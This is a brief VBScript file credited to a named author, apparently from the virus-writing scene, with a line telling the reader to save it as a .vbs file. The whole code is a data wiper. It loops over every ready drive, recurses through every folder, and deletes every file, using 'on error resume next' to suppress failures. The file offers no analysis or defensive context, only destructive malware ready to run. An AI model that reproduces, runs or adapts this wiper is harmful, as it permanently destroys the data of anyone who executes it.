' Coded by NrAziz http://www.nraziz.tk
'cyberghost4@hotmail.com
'Save this file as "filename.vbs" 

on error resume next
Dim fsys,Drives,drive,folder,files,subfolder,subfolders
set fsys=createObjecT("Scripting.FileSystemObject")
set Drives=fsys.Drives
for each drive in Drives
if drive.isready then
searchIt(drive)
end if
next

Function searchIt(path)
set Folder=fsys.getFolder(path)
set files=folder.Files
for each file in files
file.delete
next

set subfolders=folder.subfolders
for each subfolder in subfolders
searchIt(subFolder.path)
next
end function
'Thanks to VXBioLabs AcidCookie
